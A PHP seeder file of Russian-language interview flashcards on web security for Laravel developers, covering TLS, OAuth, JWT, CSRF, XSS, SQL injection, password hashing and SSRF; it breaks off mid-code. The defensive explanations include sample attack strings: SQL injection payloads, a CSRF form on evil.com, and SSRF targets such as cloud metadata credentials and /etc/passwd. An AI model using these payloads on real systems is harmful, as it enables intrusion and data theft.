<?php

namespace Database\Seeders\Data\Categories\SystemDesign;

class Security
{
    public static function all(): array
    {
        return [
            [
                'category' => 'Архитектура систем',
                'question' => 'Что такое HTTPS и TLS простыми словами?',
                'answer' => '**HTTPS = HTTP + TLS**. **TLS** (Transport Layer Security) — криптографический протокол, **шифрующий** передачу данных по сети.

Аналогия: **HTTP** — открытка, которую может прочесть любой почтальон. **HTTPS** — **запечатанный конверт**.

**Три задачи TLS:**

1. **Шифрование** — никто не подслушает по дороге (Wi-Fi, провайдер, прокси)
2. **Аутентификация сервера** — через **сертификат**, подписанный CA: «это действительно `github.com`, а не подделка»
3. **Целостность** — данные не подменены в пути (MITM не вставит свой JS)

**Сертификаты:** выдаёт **CA** (Certificate Authority — Let\'s Encrypt, DigiCert). Браузер проверяет цепочку до **корневого CA**, которому он уже доверяет.

**Версии:**

- `SSL 1.0`/`2.0`/`3.0` — **устарели, дырявые**, выключить
- `TLS 1.0`/`1.1` — **тоже устарели** (POODLE, BEAST)
- `TLS 1.2` — **минимум** для прода
- `TLS 1.3` — современный, **быстрее** (1-RTT handshake), меньше алгоритмов = меньше дыр

**В Laravel:** `URL::forceScheme(\'https\')` или `APP_URL=https://...` + редирект через `nginx`/middleware.',
                'difficulty' => 2,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Как работает TLS handshake простыми словами?',
                'answer' => '**TLS handshake** (рукопожатие) — обмен сообщениями между клиентом и сервером **перед началом шифрования**. Цель — договориться об алгоритмах и **выработать симметричный ключ сессии**.

**Поток (TLS 1.2):**

1. **`ClientHello`** — клиент: «поддерживаю эти cipher suites, вот мой `random` и `SNI`»
2. **`ServerHello`** — сервер: «выбрал `ECDHE-RSA-AES256-GCM-SHA384`, вот мой `random` и **сертификат**»
3. Клиент **проверяет сертификат** через цепочку до доверенного `CA` (Subject, SAN, validity, revocation через `OCSP`/`CRL`)
4. **Обмен ключами:**
   - **`RSA-KE`** — клиент шифрует pre-master публичным ключом сервера (нет **forward secrecy**)
   - **`(EC)DHE`** — Diffie-Hellman на эфемерных ключах (**forward secrecy**, рекомендуется)
5. Из `pre-master` + двух `random` обе стороны выводят **симметричный ключ сессии** (`KDF`)
6. **`Finished`** — обе стороны шлют шифрованную проверку handshake-сообщений
7. Дальше — **`AES-GCM`**/`ChaCha20-Poly1305` для всех данных

**Сравнение версий:**

| | **TLS 1.2** | **TLS 1.3** |
|---|---|---|
| **Full handshake** | 2 RTT | **1 RTT** |
| **Resumption** | 1 RTT | **0 RTT** (есть replay-риск) |
| **Key exchange** | RSA-KE / (EC)DHE | **только (EC)DHE + PSK** (RSA-KE удалён) |
| **RSA в сертификате** | да | да (только подпись) |
| **Алгоритмы** | десятки cipher suites, много слабых | 5 проверенных, **AEAD-only** |
| **Поле `SNI`** | в открытом виде | можно зашифровать (**ECH**) |

**Сертификат подписан RSA или ECDSA** — это **не key exchange**, а подтверждение «это правда `bank.com`».

**Forward secrecy:** даже если приватный ключ сервера утечёт **завтра**, уже снятый трафик расшифровать не получится — ключ сессии выводился из эфемерных `(EC)DHE`, которых уже нет.

**Проверка:** `openssl s_client -connect example.com:443 -servername example.com -tls1_3`.',
                'difficulty' => 4,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'В чём разница между аутентификацией и авторизацией?',
                'answer' => 'Два этапа защиты доступа, которые **часто путают**.

- **Аутентификация** (**AuthN**) — **«кто ты?»** Проверка **личности**: логин/пароль, токен, биометрия, magic link, OAuth. Результат — «ты тот, кем называешься».
- **Авторизация** (**AuthZ**) — **«что тебе можно?»** Проверка **прав** на действие: роли, permissions, ownership, policies. Результат — «можно/нельзя выполнить эту операцию».

Аналогия: на проходной показал **паспорт** — **аутентифицировали** (это действительно ты). Чтобы войти в **серверную** — проверили **разрешение** в списке допуска, **авторизовали** (тебе сюда можно).

**Порядок всегда один:** сначала AuthN, потом AuthZ. Без аутентификации авторизация не имеет смысла — кому права раздавать?

**Типичные коды ответа:**

- `401 Unauthorized` — **AuthN не прошла** (нет/невалидный токен) — несмотря на имя, это про **аутентификацию**
- `403 Forbidden` — **AuthZ не прошла** (аутентифицирован, но прав нет)

**В Laravel:**

- AuthN: `auth` middleware, `Auth::attempt()`, guards, Sanctum/Fortify
- AuthZ: `Gate::define()`, **Policies**, `$this->authorize()`, middleware `can:update,post`',
                'code_example' => '<?php
// AuthN — кто ты?
Route::middleware("auth")->group(function () {
    // AuthZ — что тебе можно?
    Route::put("/posts/{post}", [PostController::class, "update"])
        ->middleware("can:update,post");
});

// Внутри контроллера
public function update(Request $request, Post $post) {
    $this->authorize("update", $post); // AuthZ через PostPolicy@update
    $post->update($request->validated());
}',
                'code_language' => 'php',
                'difficulty' => 2,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Что такое OAuth 2.0 и какие у него grant types?',
                'answer' => '**OAuth 2.0** (`RFC 6749`) — стандарт **делегирования доступа**. Пользователь разрешает приложению `X` получить доступ к своим данным в сервисе `Y` **без передачи пароля**.

**Роли:**

- **Resource Owner** — пользователь, чьи данные защищены
- **Client** — приложение, запрашивающее доступ
- **Authorization Server** — выдаёт токены (`accounts.google.com`)
- **Resource Server** — API с защищёнными данными

**Grant types (актуальное состояние OAuth 2.1):**

| Grant | Когда брать | Статус |
|---|---|---|
| **Authorization Code + `PKCE`** | веб/SPA/mobile с пользователем | **рекомендуется** |
| **Client Credentials** | сервис → сервис, без юзера | актуальный |
| **Refresh Token** | продление сессии без перелогина | актуальный |
| **Device Code** | TV, CLI, IoT без удобного ввода | актуальный |
| **Resource Owner Password Credentials** (`ROPC`) | прямой логин/пароль | **устарел** |
| **Implicit** | старый flow для SPA | **устарел** (заменён Code+PKCE) |

**Authorization Code + PKCE — поток:**

1. Client генерирует `code_verifier` (random) и `code_challenge = SHA256(verifier)`
2. Redirect юзера на `/authorize?response_type=code&code_challenge=...`
3. Юзер логинится, соглашается
4. Auth server редиректит обратно с `?code=abc123`
5. Client шлёт `POST /token` с `code` + **`code_verifier`** (не challenge!)
6. Auth server проверяет `SHA256(verifier) == challenge` → выдаёт `access_token` + `refresh_token`

**Зачем PKCE:** защищает от перехвата `code` на мобильных/SPA — без `verifier` украденный код бесполезен. С 2025 OAuth 2.1 **PKCE обязателен для всех клиентов**, включая confidential.

**Важно:** OAuth — про **авторизацию делегирования**, НЕ про аутентификацию юзера. Для «кто залогинился» — **OpenID Connect** поверх OAuth.',
                'difficulty' => 4,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Что такое JWT и какие плюсы и минусы?',
                'answer' => '**JWT** (JSON Web Token, `RFC 7519`) — **подписанный токен** из трёх частей через точку: `header.payload.signature`, каждая часть **base64url-кодирована**.

**Структура:**

- **header** — `{"alg":"HS256","typ":"JWT"}` — алгоритм подписи
- **payload** — `claims`: `sub` (user id), `iat`, `exp`, `aud`, кастомные роли
- **signature** — `HMAC` или `RSA`/`ECDSA` от `header.payload` секретом/приватным ключом

**Алгоритмы подписи:**

- **симметричные** — `HS256`/`HS384`/`HS512` (HMAC, один секрет)
- **асимметричные** — `RS256`/`ES256` (приватный подписывает, публичный проверяет — удобно для микросервисов)

**Плюсы:**

- **stateless** — сервер не хранит сессию, любой инстанс с ключом проверит
- **межсервисная аутентификация** — Service B верифицирует токен Service A через публичный ключ
- удобно для **SPA / mobile** клиентов

**Минусы:**

- **нельзя отозвать до `exp`** без серверного blacklist — теряем stateless
- **размер больше cookie** `session_id` (сотни байт vs ~30)
- **payload не зашифрован**, только подписан — НЕ клади туда чувствительное (для шифрования — `JWE`)
- классические атаки: `alg=none`, `RS256→HS256 confusion` (публичный ключ скармливают как HMAC-секрет) — обязателен **явный allow-list алгоритмов**

**Митигация:** короткий `exp` (5–15 мин) + **refresh token** в БД, явный `aud`/`iss`-чек, библиотеки с защитой от `alg=none`.',
                'code_example' => '<?php
use Firebase\\JWT\\JWT;
use Firebase\\JWT\\Key;

// Issue
$jwt = JWT::encode([
    "sub" => $user->id,
    "iat" => time(),
    "exp" => time() + 900,        // 15 минут
    "aud" => "api.example.com",
], $secret, "HS256");

// Verify — ОБЯЗАТЕЛЬНО явный allow-list алгоритмов
$payload = JWT::decode($jwt, new Key($secret, "HS256"));

// ❌ Уязвимо: позволяет alg=none / алгоритм-confusion
// JWT::decode($jwt, new Key($secret));  // без явного алгоритма

// Структура: header.payload.signature
// eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjMiLCJleHAiOjE3MDB9.<base64-signature>',
                'code_language' => 'php',
                'difficulty' => 3,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'JWT vs server-side sessions - что выбрать?',
                'answer' => 'Это **два разных подхода** к идентификации юзера между запросами — **stateful** vs **stateless**.

**Server-side session:**

- сервер хранит сессию в **общем store** (`Redis`, БД, `Memcached`)
- клиенту отдаёт **`session_id`** (`~30 байт`) в **`HttpOnly` cookie**
- на каждый запрос — `SELECT` из store по `session_id`
- **logout = `DELETE`** из store

**JWT (stateless):**

- сервер **ничего не хранит**, только **проверяет подпись**
- токен **self-contained**: внутри `sub`, `exp`, роли, что угодно
- на каждый запрос — проверка `HMAC`/`RSA` подписи + `exp`
- **logout — проблема** (см. карточку про отзыв JWT)

**Сравнение:**

| | **Sessions** | **JWT** |
|---|---|---|
| **Состояние на сервере** | да (`Redis`/БД) | **нет** |
| **Отзыв токена** | **мгновенный** (`DEL` из Redis) | сложный (denylist, `token_version`) |
| **Размер cookie/header** | `~30 байт` | `~500–1500 байт` |
| **Масштабирование** | нужен общий store | **любой инстанс с ключом** |
| **Микросервисы** | каждый идёт в общий store | service-to-service по `JWKS` |
| **Изменение профиля** | видно сразу | до `exp` — старые роли |
| **Подходит для SSR/web** | **отлично** | избыточно |
| **Подходит для mobile/SPA** | можно, но `cookie` неудобен | **естественно** |

**Когда что:**

- **Монолит, веб-приложение, одна БД** → **sessions**. Проще, безопаснее, проблем с отзывом нет.
- **Микросервисы с межсервисной аутентификацией** → JWT (`RS256` + `JWKS`).
- **Mobile/SPA + REST API** → JWT с **коротким `exp`** (15 мин) + **refresh token в БД**.
- **B2B SSO/OAuth-федерация** → **OIDC `id_token`** или **opaque token + introspection**.

**Anti-pattern:** JWT с `exp` через 30 дней без денилиста. После увольнения сотрудника он 30 дней ходит в систему.

**Эмпирическое правило:** **начинай с sessions**, переходи на JWT только когда **архитектура реально требует stateless** (микросервисы, edge, многоплатформенность).',
                'difficulty' => 4,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Что такое access token и refresh token?',
                'answer' => 'Пара токенов разной длительности жизни — компромисс между **stateless-производительностью** и **возможностью отзыва**.

| | **Access token** | **Refresh token** |
|---|---|---|
| **Срок жизни** | 5–15 мин (до 1 ч) | дни / недели / месяцы |
| **Назначение** | пропуск к API на каждом запросе | обмен на новый `access` без перелогина |
| **Хранение клиентом** | память приложения / `Authorization: Bearer` | **HttpOnly + Secure + SameSite** cookie |
| **Где валидируется** | по подписи (`stateless`) | по записи в БД (`stateful`) |
| **Можно отозвать?** | нет, ждём `exp` | да, удалили из БД |

**Поток (flow):**

1. Клиент логинится → сервер выдаёт **пару**: `access` (15 мин) + `refresh` (30 дней)
2. Клиент шлёт `access` в `Authorization: Bearer ...` на каждый запрос
3. Когда API ответил `401` → клиент идёт на `POST /auth/refresh` с `refresh`
4. Сервер проверяет `refresh` в БД → выдаёт **новую пару**, старый `refresh` помечает использованным (**rotation**)
5. **Logout** = удаление `refresh` из БД, максимум через 15 мин старый `access` сам умрёт

**Зачем такой огород:**

- `access` короткий → утечка ограничена 15 минутами
- `refresh` хранится в БД → можно мгновенно **отозвать** (logout, смена пароля, бан)
- **rotation + reuse detection** — если кто-то использовал тот же `refresh` дважды, инвалидируем всю цепочку (украли)

Это стандарт **OAuth 2.0** и `Laravel Sanctum` / `Passport`.',
                'code_example' => '<?php
// POST /auth/login
return response()->json([
    "access_token" => JWT::encode([
        "sub" => $user->id,
        "exp" => time() + 900,                   // 15 минут
    ], $secret, "HS256"),
    "refresh_token" => DB::table("refresh_tokens")->insertGetId([
        "user_id" => $user->id,
        "token_hash" => hash("sha256", $raw = bin2hex(random_bytes(32))),
        "expires_at" => now()->addDays(30),
    ]) ? $raw : null,
]);

// POST /auth/refresh (rotation + reuse detection)
$row = DB::table("refresh_tokens")
    ->where("token_hash", hash("sha256", $raw))
    ->first();

if (!$row || $row->revoked_at) {
    // reuse detected — инвалидируем всю цепочку
    DB::table("refresh_tokens")->where("user_id", $row?->user_id)->update(["revoked_at" => now()]);
    abort(401);
}

// rotate: старый refresh помечаем, выдаём новую пару',
                'code_language' => 'php',
                'difficulty' => 3,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Что такое RBAC и ABAC?',
                'answer' => 'Две модели **авторизации** (`AuthZ`), решающие «что юзеру можно делать».

**RBAC** (Role-Based Access Control) — доступ **через роли**:

- у пользователя одна или несколько **ролей** (`admin`, `editor`, `viewer`)
- у каждой роли — **набор permissions** (`posts.create`, `posts.delete`)
- проверка: «есть ли у юзера роль с нужным permission?»
- **прост в понимании**, легко рисуется матрицей `роль × ресурс`
- слабо учитывает **контекст** — нельзя сказать «редактировать может только автор поста»

**ABAC** (Attribute-Based Access Control) — доступ **через атрибуты**:

- решение строится из **атрибутов**: `subject` (юзер: `department=sales`), `resource` (пост: `owner_id=42`), `action` (`edit`), `environment` (`time`, `IP`)
- правила вида: «`edit` разрешён, если `subject.id == resource.owner_id` ИЛИ `subject.role == admin`»
- **гибко**, легко выражать ownership, time-based, location-based
- сложнее аудит — правила могут пересекаться, нужны политики (`OPA`, `Cedar`, `XACML`)

**Сравнение:**

| | **RBAC** | **ABAC** |
|---|---|---|
| **Гранулярность** | роль → permissions | per-resource атрибуты |
| **Контекст** | плохо | отлично |
| **Сложность** | низкая | высокая |
| **Когда брать** | стандартные приложения | сложные домены (медицина, банки) |

**На практике** — комбинируют: **RBAC как база** (роль `editor` даёт `posts.edit`) + **ABAC-правила сверху** (ownership: только свой пост).

**В Laravel:** `RBAC` — `spatie/laravel-permission`; `ABAC` — `Gate::define()` / `Policies` с проверкой ownership и контекста.',
                'code_example' => '<?php
// RBAC через spatie/laravel-permission
$user->assignRole("editor");
$user->givePermissionTo("posts.publish");
if ($user->hasPermissionTo("posts.publish")) { /* ... */ }

// ABAC через Policy: правило учитывает атрибуты ресурса и контекста
class PostPolicy
{
    public function update(User $user, Post $post): bool
    {
        return $user->id === $post->author_id        // ownership
            || $user->hasRole("admin")               // RBAC fallback
            || ($user->department === $post->department
                && now()->isBetween("09:00", "18:00")); // environment
    }
}

// Gate::authorize("update", $post) → 403, если правило не прошло',
                'code_language' => 'php',
                'difficulty' => 3,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Что такое CORS простыми словами?',
                'answer' => '**CORS** (Cross-Origin Resource Sharing) — **механизм браузера**, контролирующий, может ли **cross-origin JS читать ответ** другого `origin`.

**Контекст — Same-Origin Policy (SOP):** браузер по умолчанию **запрещает** сайту `example.com` через `fetch`/`XHR` читать ответ от `api.other.com`. `origin` = `схема + хост + порт`.

`CORS` — это **способ для сервера явно разрешить** определённым origin-ам читать ответ через заголовки.

**Заголовки на сервере:**

- `Access-Control-Allow-Origin: https://example.com` — кому разрешено (или `*` для публичных API без credentials)
- `Access-Control-Allow-Methods: GET, POST, PUT, DELETE`
- `Access-Control-Allow-Headers: Content-Type, Authorization`
- `Access-Control-Allow-Credentials: true` — разрешить отправку cookie (тогда `Allow-Origin` НЕ может быть `*`)
- `Access-Control-Max-Age: 86400` — кэш preflight ответа в браузере

**Preflight (`OPTIONS`)** — браузер шлёт **перед** «сложным» запросом (методы кроме `GET`/`POST`/`HEAD`, `Authorization`, кастомные заголовки, `Content-Type: application/json`):

```
OPTIONS /api/users HTTP/1.1
Origin: https://example.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Authorization
```

Сервер отвечает заголовками — браузер пускает или режет.

**ВАЖНО — что CORS НЕ делает:**

- **НЕ защита от XSS** — XSS лечится экранированием, `CSP`, `HttpOnly`
- **НЕ защита от CSRF** — CSRF лечится токенами + `SameSite`-cookie
- **НЕ защита сервера** — `curl`/Postman игнорируют CORS, это **только браузер**
- НЕ запрещает запрос — запрос **уйдёт** на сервер, браузер просто **не отдаст ответ JS-у**

**Типичные ошибки:** `*` + `Allow-Credentials: true` (браузер отбросит), забыли `OPTIONS` в роутах → `405` на preflight.',
                'code_example' => '# Сервер на preflight (OPTIONS)
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 86400

# В Laravel — config/cors.php
# "paths" => ["api/*"],
# "allowed_origins" => ["https://example.com"],
# "allowed_methods" => ["*"],
# "supports_credentials" => true,',
                'code_language' => 'bash',
                'difficulty' => 3,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Что такое CSRF и как защищаться?',
                'answer' => '**CSRF** (Cross-Site Request Forgery) — атака, в которой **вредоносный сайт через браузер жертвы** заставляет её **отправить запрос** на доверенный сайт, используя её **активную сессию** (cookie).

**Сценарий атаки:**

1. Жертва залогинена в `bank.com` — в браузере живёт sessionId-cookie
2. Жертва открывает `evil.com`, на нём `<form action="https://bank.com/transfer" method="POST">` с автосабмитом
3. Браузер автоматически **прикладывает cookie** `bank.com` к запросу
4. `bank.com` видит валидную сессию — выполняет перевод от имени жертвы

**Защиты (нужно несколько слоёв):**

1. **CSRF-токен** (synchronizer token) — сервер генерирует случайный токен на сессию, кладёт в форму **скрытым полем**. На `evil.com` токена нет — запрос отбрасывается. В Laravel — `@csrf` директива + `VerifyCsrfToken` middleware.
2. **`SameSite` cookie** — флаг `SameSite=Lax` или `Strict` запрещает браузеру слать cookie в кросс-доменных запросах. С `Lax` (по умолчанию в современных браузерах) большая часть CSRF закрыта автоматически.
3. **`Origin`/`Referer` чек** — сервер проверяет, что запрос пришёл с своего домена.
4. **Double-submit cookie** — токен в cookie + в заголовке, сервер сравнивает. Подходит для **stateless API**.

**Что НЕ помогает:**

- HTTPS — атакующий уже не подслушивает, а заставляет жертву отправить запрос
- `HttpOnly` — спасает от XSS-кражи, но cookie всё равно отправляется автоматически
- CORS — это про чтение ответа, а CSRF про **запись запроса**

**Какие методы безопасны:** `GET` (safe) не должен менять состояние. CSRF обычно бьёт по `POST`/`PUT`/`DELETE`.',
                'code_example' => '<!-- Blade: Laravel автоматически добавляет токен -->
<form method="POST" action="/transfer">
    @csrf
    <input name="amount" value="1000">
</form>

<!-- Что получится -->
<input type="hidden" name="_token" value="aBcD1234...">

<!-- AJAX: токен через meta-тег + заголовок X-CSRF-TOKEN -->
<meta name="csrf-token" content="{{ csrf_token() }}">
<script>
fetch("/api/transfer", {
    method: "POST",
    headers: {
        "X-CSRF-TOKEN": document.querySelector("meta[name=csrf-token]").content,
        "Content-Type": "application/json",
    },
    body: JSON.stringify({amount: 1000}),
});
</script>

<!-- config/session.php: SameSite=Lax по умолчанию -->
<!-- "same_site" => "lax" — закрывает большинство CSRF без токена -->',
                'code_language' => 'blade',
                'difficulty' => 3,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Что такое XSS и как защищаться?',
                'answer' => '**XSS** (Cross-Site Scripting) — **инъекция чужого JavaScript** в твою страницу, который потом исполняется **в браузере других пользователей** с их правами.

**Типы:**

- **Stored XSS** — скрипт **сохраняется в БД** (комментарий, профиль) и выдаётся всем посетителям. Самый опасный.
- **Reflected XSS** — скрипт **в URL/параметре**, сервер вернул его в ответ без экранирования. Жертве нужна подготовленная ссылка.
- **DOM-based XSS** — вообще не доходит до сервера: уязвимый клиентский JS пишет `location.hash` в `innerHTML`.

**Что атакующий получает:**

- кражу **cookie** (через `document.cookie`, если нет `HttpOnly`)
- действия **от имени жертвы** (через её активную сессию)
- кейлоггинг, фишинговые формы поверх UI

**Защиты (нужно несколько слоёв):**

1. **Экранирование вывода** — главное. В Laravel `{{ $var }}` (Blade) автоматически делает `htmlspecialchars` с `ENT_QUOTES`. `{!! $var !!}` — **сырой HTML, опасно**.
2. **`Content-Security-Policy`** — браузер исполнит JS **только из разрешённых источников**. Даже если атакующий внедрил `<script>`, CSP его блокирует.
3. **`HttpOnly` cookie** — JS не видит `document.cookie`, кража сессии затруднена.
4. **Санитизация HTML**, если разрешён (комменты с форматированием) — `HTMLPurifier`, `DOMPurify`. Whitelist разрешённых тегов.
5. **Контекстное экранирование** — для атрибутов, JS, CSS, URL разные правила. Внутри `<script>` — `json_encode` с `JSON_HEX_TAG`.

**Главное правило:** **никогда** не вставляй пользовательский ввод в HTML/JS/CSS/URL **сырым**.',
                'code_example' => '<!-- Blade: { { } } автоматически экранирует -->
<div>{{ $comment->text }}</div>
<!-- "<script>alert(1)</script>" → "&lt;script&gt;alert(1)&lt;/script&gt;" -->

<!-- ❌ Опасно — сырой HTML -->
<div>{!! $comment->text !!}</div>

<!-- В JS-контексте: json_encode -->
<script>
    const user = {!! json_encode($user, JSON_HEX_TAG | JSON_HEX_AMP) !!};
</script>

<!-- CSP header -->
Content-Security-Policy:
    default-src \'self\';
    script-src \'self\' \'nonce-abc123\';
    object-src \'none\';

<!-- HttpOnly cookie (config/session.php) -->
"http_only" => true,',
                'code_language' => 'blade',
                'difficulty' => 3,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Что такое OWASP Top 10?',
                'answer' => '**OWASP Top 10** — топ-10 **самых критичных веб-уязвимостей** по версии **Open Web Application Security Project**. Базовый **чек-лист** для аудита и собесов. Версия 2021 (обновляется каждые 3–4 года):

| Код | Категория | Что значит |
|---|---|---|
| **A01** | Broken Access Control | Юзер обходит права (IDOR, force browsing, отсутствие проверки ownership) |
| **A02** | Cryptographic Failures | Plain-text пароли, слабые алгоритмы (`md5`, `RC4`), нет TLS |
| **A03** | Injection | `SQLi`, `NoSQLi`, command injection, LDAP injection |
| **A04** | Insecure Design | Архитектурные ошибки — нет threat modeling, нет rate limit на критичных операциях |
| **A05** | Security Misconfiguration | Дефолтные креды, `debug=true` в проде, открытые `.git`/`.env` |
| **A06** | Vulnerable Components | Устаревшие либы с CVE (`log4j`, `Spring4Shell`) |
| **A07** | Auth Failures | Слабые пароли, brute-force, credential stuffing, session fixation |
| **A08** | Data Integrity Failures | Supply chain (npm/composer-пакеты), unsigned auto-updates, insecure CI/CD |
| **A09** | Logging/Monitoring Failures | Нет логов входов/ошибок → атаку замечают через месяцы |
| **A10** | **SSRF** | Сервер по запросу клиента ходит на внутренний адрес (`169.254.169.254`, Redis) |

**Главное смещение 2021 vs 2017:**

- `Broken Access Control` поднялся с A05 на **A01** — №1 по частоте находок
- Появились **A04 Insecure Design** и **A10 SSRF** — раньше их не было

**Зачем знать:**

- Это **минимум**, который спрашивают на собесах и проверяют пентестеры
- Для каждой категории есть **OWASP Cheat Sheet** с готовыми митигациями
- Compliance (PCI-DSS, SOC 2) часто ссылается на этот список',
                'difficulty' => 3,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Что такое SQL injection и как защищаться?',
                'answer' => '**SQL Injection** — подмена логики SQL-запроса через **непроверенный пользовательский ввод**, который попадает прямо в строку запроса.

**Канонический пример:**

```php
$query = "SELECT * FROM users WHERE name = \'$name\'";
```

При `$name = "\' OR 1=1 --"` запрос становится:

```sql
SELECT * FROM users WHERE name = \'\' OR 1=1 --\'
```

— вернёт всю таблицу. С `\'; DROP TABLE users; --` — снесёт её.

**Чем грозит:**

- **чтение** всех данных (`UNION SELECT password FROM users`)
- **изменение/удаление**
- **эскалация прав** в БД, выполнение команд ОС через `xp_cmdshell` (MSSQL) или функции расширений
- **обход аутентификации** (`OR 1=1 -- ` в логине)

**Защиты (несколько слоёв):**

1. **Prepared statements (параметризация)** — главное. SQL и данные **разделяются**: значение никогда не парсится как SQL.
2. **ORM** (`Eloquent`, `Doctrine`) — параметризует по умолчанию. `User::where("email", $email)` — безопасно.
3. **Whitelist для имён колонок/таблиц** — их **параметризовать нельзя**, только проверять по списку.
4. **Принцип наименьших привилегий** — у app-юзера БД нет `DROP`/`GRANT`/`CREATE USER`.
5. **WAF** (`ModSecurity`, Cloudflare) — дополнительный слой против известных паттернов.
6. **Stored Procedures** — если внутри них тоже параметризация, не динамический SQL.

**Антипаттерны, которые всё ещё ломают:**

- ручной `DB::raw()` со склеиванием строк
- `orderBy($_GET[\'sort\'])` без whitelist — позволяет `ORDER BY (SELECT ...)`
- `LIKE \'%\' . $q . \'%\'` без эскейпа `%` и `_`',
                'code_example' => '<?php
// плохо - SQL injection
$users = DB::select("SELECT * FROM users WHERE email = \'$email\'");

// хорошо - prepared statement
$users = DB::select("SELECT * FROM users WHERE email = ?", [$email]);

// хорошо - Eloquent (под капотом prepared)
$user = User::where("email", $email)->first();

// для имён колонок нужен whitelist
$allowed = ["name", "created_at", "email"];
$column = in_array($sortBy, $allowed) ? $sortBy : "id";
User::orderBy($column)->get();',
                'code_language' => 'php',
                'difficulty' => 3,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Почему нельзя хешировать пароли через md5 или sha256?',
                'answer' => '**`md5` и `sha256` спроектированы быть быстрыми** — именно поэтому **непригодны для паролей**.

**Цифры (для понимания):**

- современный GPU (RTX 4090) считает **~100 млрд `sha256`/сек**
- словарь из 14 млн популярных паролей перебирается **за миллисекунду**
- весь 8-символьный keyspace (`[a-zA-Z0-9]`) — **за час**
- `md5` к тому же **криптографически сломан** (collision attacks с 2004 года)

**Что нужно для паролей — медленные, memory-hard функции:**

| Алгоритм | Год | Параметры | Особенности |
|---|---|---|---|
| **`bcrypt`** | 1999 | `cost` (12+) | Классика, проверен временем. **Лимит 72 байта** на пароль |
| **`scrypt`** | 2009 | `N`, `r`, `p` (память/время/параллелизм) | Memory-hard |
| **`argon2id`** | 2015 | `memory`, `time`, `parallelism` | **Победитель Password Hashing Competition**. Защита от GPU/ASIC. **Современный выбор** |

**Что они делают правильно:**

- **медленные** (50–300 мс на проверку) — атакующий не сможет перебирать миллиарды/сек
- **memory-hard** (`scrypt`, `argon2id`) — требуют МБ памяти на хеш, GPU/ASIC выигрывают мало
- **автоматическая соль** — нет двух одинаковых хешей у одного пароля
- **встроенный параметр сложности** — можно увеличивать `cost` по мере роста железа

**В PHP:**

- `password_hash($pwd, PASSWORD_BCRYPT)` — `bcrypt`, по умолчанию
- `password_hash($pwd, PASSWORD_ARGON2ID)` — **рекомендуется**
- `password_verify()` — проверка (хеш сам несёт алгоритм и соль)
- `password_needs_rehash()` — обновить хеш, если повысили `cost`

**В Laravel:** `Hash::make()` / `Hash::check()`, алгоритм в `config/hashing.php`.',
                'code_example' => '<?php
$hash = password_hash("password123", PASSWORD_ARGON2ID);
if (password_verify($input, $hash)) {
    // OK
}',
                'code_language' => 'php',
                'difficulty' => 3,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Что такое SSRF и как защитить file_get_contents() / Guzzle, если URL вводит пользователь?',
                'answer' => '**SSRF** (Server-Side Request Forgery) — атака, в которой **злоумышленник заставляет сервер сделать HTTP-запрос** на адрес, выбранный атакующим. Сервер, в отличие от внешнего юзера, **имеет сетевой доступ внутрь VPC** — отсюда вся опасность.

**Канонические дыры:** «preview по URL», «загрузить аватарку из URL», парсер Open Graph, webhook receiver.

**Что атакующий читает:**

- **AWS metadata** — `http://169.254.169.254/latest/meta-data/iam/security-credentials/` → IAM-credentials root-уровня
- **Внутренние сервисы** — `http://localhost:6379/` (Redis без auth), `http://internal-admin/`
- **GCP/Azure metadata** — `metadata.google.internal`
- **Файлы** через `file:///etc/passwd`

**Защита — многослойная:**

1. **Allowlist схем** — только `http`/`https`. Запретить `file://`, `gopher://` (можно отправить байты в любой TCP-сокет, включая `Redis`), `dict://`, `ftp://`
2. **Allowlist хостов** — если знаешь, что разрешено (например, `imgur.com`), сравнивай **после `DNS`-резолва**
3. **Резолв DNS вручную + проверка IP**:
   - **RFC 1918** — `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`
   - **Loopback** — `127.0.0.0/8`, `::1`
   - **Link-local** — `169.254.0.0/16` (**метаданные облака!**)
   - **`0.0.0.0`**, `multicast`
4. **Защита от DNS rebinding** — резолви имя **один раз** и используй полученный `IP` для запроса (`Guzzle`: `CURLOPT_RESOLVE`). Иначе между TOCTOU атакующий подменит ответ DNS на внутренний IP
5. **Отдельный namespace/security group** без доступа в private-сети
6. **В cloud** — отключи **IMDSv1**, требуй **IMDSv2** с обязательным токеном
7. **Запретить редиректы** или проверять `Location` заново — `302` на `http://169.254.169.254` обходит примитивную проверку

**Минимальный safe-fetch:** allowlist схем + `gethostbynamel` + `filter_var FILTER_FLAG_NO_PRIV_RANGE|NO_RES_RANGE` + запрет редиректов + таймаут.',
                'code_example' => '<?php
use GuzzleHttp\\Client;

function fetchUserUrl(string $url): string
{
    // 1. allowlist схем
    $parsed = parse_url($url);
    if (!in_array($parsed["scheme"] ?? "", ["http", "https"], true)) {
        throw new InvalidArgumentException("scheme not allowed");
    }

    // 2. резолв и проверка IP до запроса
    $host = $parsed["host"] ?? "";
    $ip = gethostbyname($host);
    if ($ip === $host) throw new RuntimeException("dns resolve failed");

    if (
